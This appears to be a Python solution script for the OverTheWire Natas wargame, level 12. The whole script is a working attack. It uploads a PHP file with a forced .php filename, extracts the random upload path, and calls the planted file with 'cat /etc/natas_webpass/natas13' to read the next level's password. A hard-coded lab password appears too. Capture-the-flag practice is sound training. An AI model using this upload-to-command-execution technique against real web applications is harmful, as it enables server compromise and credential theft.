import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

session = requests.Session()
response = session.post(url , files={"uploadedfile" : open('pwd_script.php','rb') } , data = {"filename" : "pwd_script.php" , "MAX_FILE_SIZE" : "1000"}, auth=(username,password))

rand_name = re.findall('"upload/(.*).php"',response.text)[0] #addtw10c.php
response = session.get(url + 'upload/'+rand_name+'.php?pwd=cat /etc/natas_webpass/natas13' , auth =(username,password))

content = response.text
print(content)
